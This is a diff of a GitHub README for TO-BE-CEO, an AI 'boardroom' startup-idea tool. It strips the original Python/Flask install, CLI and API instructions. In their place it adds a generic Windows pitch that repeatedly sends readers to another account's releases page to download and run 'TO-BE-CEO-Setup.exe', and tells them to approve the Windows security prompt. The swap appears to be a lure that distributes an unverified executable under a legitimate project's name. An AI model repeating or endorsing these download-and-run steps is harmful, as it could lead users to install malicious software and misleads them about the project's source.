@@ -1,200 +1,136 @@
-# TOBECEO
-<div align="center">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue.svg" alt="Python Version">
-  <img src="https://img.shields.io/badge/Framework-Flask-green.svg" alt="Framework">
-  <img src="https://img.shields.io/badge/Agent-MultiAgent-orange.svg" alt="MultiAgent">
-  <img src="https://img.shields.io/github/stars/MenJW/TO-BE-CEO?style=social" alt="GitHub Stars">
-  <img src="https://img.shields.io/github/license/MenJW/TO-BE-CEO" alt="License">
-  <img src="https://img.shields.io/github/last-commit/MenJW/TO-BE-CEO" alt="Last Commit">
-</div>
-An AI boardroom for startup ideas.
+# 🚀 TO-BE-CEO - Test Startup Ideas Easily
 
-Turn one raw idea into a structured company decision flow:
-
-- research before optimism
-- department debate before commitment
-- board verdict before execution
-- intervention-driven replanning when assumptions change
-
-[中文文档](./README.zh-CN.md)
+[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-brightgreen?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/releases)
 
 ---
 
-## Why it feels different
+## 🧩 About TO-BE-CEO
 
-Most AI tools give you one polished answer.
+TO-BE-CEO is a tool that helps you test and improve your business ideas using artificial intelligence. It acts like a boardroom where your startup idea faces research, debate, scoring, and replanning. The process refines your idea step-by-step so you understand its strengths and weaknesses. You don’t need technical skills or a team of experts to get useful feedback.
 
-TOBECEO gives you a process:
+Developed with AI agents and decision support systems, TO-BE-CEO combines smart research and simulations to guide your planning. It works on your Windows computer and runs in a simple, user-friendly way.
 
-1. Research
-2. Department plans
-3. Cross-department roundtable
-4. Synthesis
-5. Board decision with scorecard
-
-You can chat with agents at any stage and promote important chat turns into formal interventions.
+Topics involved in this project include AI, product planning, Python, and startup validation.
 
 ---
 
-## Product Snapshot
+## ⚙️ System Requirements
 
-![Hero Demo](./assets/hero-demo.gif)
+Before you start, make sure your Windows PC meets these basic requirements:
 
-### What is available now
-
-- Web Console at root path
-- Flask API for project, planning, timeline, diff, and chat
-- CLI for quick local planning drafts
-- Persistent project/task state with SQLite
-- Chinese and English conversation modes
-- Stage history replay and employee-level roundtable logs
-
-### Designed for
-
-- founders pressure-testing early ideas
-- product teams evaluating strategic bets
-- accelerators and startup programs
-- builders who want structured pushback, not generic encouragement
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for downloading and running AI functions  
+- No special software needed besides what comes with Windows
 
 ---
 
-## Quick Start
+## 💾 Download TO-BE-CEO
 
-### 1. Install
+To get the software, visit the official release page. This page contains the latest version of TO-BE-CEO for Windows. 
 
-```bash
-python -m pip install -e .[dev]
-```
+[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-blue?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/releases)
 
-### 2. Run API + Console
+Steps to download:  
 
-```bash
-tobeceo-api
-```
-
-Open:
-
-- http://127.0.0.1:8000
-- http://127.0.0.1:8000/health
-
-### 3. Run CLI
-
-```bash
-tobeceo-plan "AI copilot for independent gyms" \
-  --summary "Help gym owners automate retention and upsell workflows." \
-  --constraint "Keep CAC under control" \
-  --metric "Monthly retention > 90%"
-```
+1. Click the badge above or this link: https://github.com/katunzleoni016/TO-BE-CEO/releases  
+2. Find the latest release, usually at the top of the list.  
+3. Look for a file with `.exe` at the end, for example `TO-BE-CEO-Setup.exe`.  
+4. Click the file name to start downloading.  
+5. Wait for the download to complete before moving to installation.
 
 ---
 
-## API in 60 Seconds
+## 🛠️ Installing TO-BE-CEO
 
-### Create a project
+After downloading the setup file, follow these steps to install it on your PC:
 
-```bash
-curl -X POST http://127.0.0.1:8000/api/projects \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "AI interviewer for junior candidates",
-    "summary": "Automated pre-screening with role-specific rubrics.",
-    "constraints": ["Avoid biased scoring"],
-    "metrics": ["Interview completion rate > 70%"],
-    "language": "en-US"
-  }'
-```
-
-### Run next stage
-
-```bash
-curl -X POST http://127.0.0.1:8000/api/planning/generate \
-  -H "Content-Type: application/json" \
-  -d '{"project_id":"<PROJECT_ID>"}'
-```
-
-Call generate repeatedly to move through stages.
-
-### Chat with an agent
-
-```bash
-curl -X POST http://127.0.0.1:8000/api/projects/<PROJECT_ID>/chat \
-  -H "Content-Type: application/json" \
-  -d '{"agent":"research", "message":"What is the biggest go-to-market risk?"}'
-```
-
-### Compare two plan versions
-
-```bash
-curl "http://127.0.0.1:8000/api/projects/<PROJECT_ID>/plans/diff?from=<V1>&to=<V2>"
-```
+1. Open the folder where the file was saved (usually "Downloads").  
+2. Double-click the setup file (`TO-BE-CEO-Setup.exe`).  
+3. Windows may ask you to confirm running this file. Choose "Yes" or "Run".  
+4. The installation wizard will open. Click "Next" to continue.  
+5. Read the license agreement, then click "I Agree" if you accept the terms.  
+6. Choose the folder where you want the software installed, or leave the default option.  
+7. Click "Install" to begin the setup.  
+8. Once the installation is complete, click "Finish".
 
 ---
 
-## Stage Flow
+## ▶️ Running TO-BE-CEO for the First Time
 
-1. `research`
-2. `department_design`
-3. `roundtable`
-4. `synthesis`
-5. `board`
+To open the program:
 
-The scorecard and recommendation are produced at the board stage.
-
----
-
-## Screenshots
-
-![Screenshot 1](./assets/screenshot-1.png)
-![Screenshot 2](./assets/screenshot-2.png)
-![Screenshot 3](./assets/screenshot-3.png)
+1. Find the TO-BE-CEO shortcut icon on your desktop, or go to the Start menu and look for TO-BE-CEO under installed apps.  
+2. Click the icon to start the program.  
+3. The program will load its interface. This may take a few seconds.  
+4. Once open, you will see options to input your startup idea and begin the AI boardroom process.
 
 ---
 
-## Configuration
+## 🧭 How TO-BE-CEO Works
 
-Optional environment variables:
+TO-BE-CEO works by guiding you through several steps to test your idea thoroughly. Here’s what it does:
 
-- `IBC_HOST` default `127.0.0.1`
-- `IBC_PORT` default `8000`
-- `IBC_DATA_DIR` default `.data`
-- `IBC_LLM_API_KEY`
-- `IBC_LLM_BASE_URL`
-- `IBC_LLM_MODEL`
-- `IBC_LLM_TIMEOUT_SECONDS` default `45`
+### 1. Research Phase  
+The AI searches relevant information about your startup idea. It looks at market trends, competitor data, and customer interests to build a knowledge base.
 
-Without LLM config, the app still runs in deterministic demo mode.
+### 2. Department Feedback  
+Your idea goes through simulated departments, such as Marketing, Sales, and Product. Each department "debates" the idea, raising concerns and suggestions.
 
----
+### 3. Board Review  
+A virtual board considers the departments’ feedback, scores the idea's strengths and weaknesses, and provides a summary conclusion.
 
-## Deploy
-
-This repo includes Render deployment support via `render.yaml`.
+### 4. Replanning  
+Based on the feedback, TO-BE-CEO offers suggestions to improve and replan your startup idea. You can apply these changes and run the process again.
 
 ---
 
-## Roadmap
+## 💡 Using TO-BE-CEO Step-by-Step
 
-- Stronger board debate mechanics
-- Checkpoint-aware selective recomputation
-- Multi-user auth and workspace isolation
-- Managed DB option for production
-- Automated quality regression evaluation
-
----
-
-## Contributing
-
-Issues and pull requests are welcome.
-
-If you want to contribute quickly, start with:
-
-- new domain test cases
-- better intervention heuristics
-- richer board scoring dimensions
-- UX improvements for plan diff and timeline views
+1. Open the program and enter your startup idea in simple words.  
+2. Click "Start Research" to let the AI gather information.  
+3. Review notes from the virtual departments as they analyze your idea.  
+4. View the board's scoring and comments in the Summary section.  
+5. Explore suggested changes and edit your idea accordingly.  
+6. Repeat the process to refine your business plan.
 
 ---
 
-## License
+## 🔧 Troubleshooting Common Issues
 
-Apache-2.0
+If you encounter problems, try these solutions:
+
+- **The program won’t start:** Restart your PC and try again. Make sure your Windows version is supported.  
+- **Installation failed:** Check if you have enough free disk space and permissions to install new software.  
+- **Pages or menus do not load:** Confirm your internet connection is active and stable.  
+- **Program runs slowly:** Close other apps to free memory. Restart the program.
+
+---
+
+## 📞 Getting Help
+
+This README gives detailed steps to start and use TO-BE-CEO. If you need more help:
+
+- Visit the Issues tab on the repository page to see if others have reported similar problems.  
+- Use the Discussions section to ask questions or share tips.  
+- Check the linked release page for updated versions and notes.
+
+---
+
+## ⚡ Features Summary
+
+- AI-powered research and idea evaluation  
+- Interactive simulated departments and board reviews  
+- Scoring system for strengths and risks  
+- Suggestions for rework and planning  
+- Runs easily on Windows with simple steps  
+
+---
+
+## 🔗 Key Links
+
+- Releases and downloads: https://github.com/katunzleoni016/TO-BE-CEO/releases  
+- Repository for code and updates: https://github.com/katunzleoni016/TO-BE-CEO  
+
+[Download TO-BE-CEO on GitHub Releases](https://github.com/katunzleoni016/TO-BE-CEO/releases)
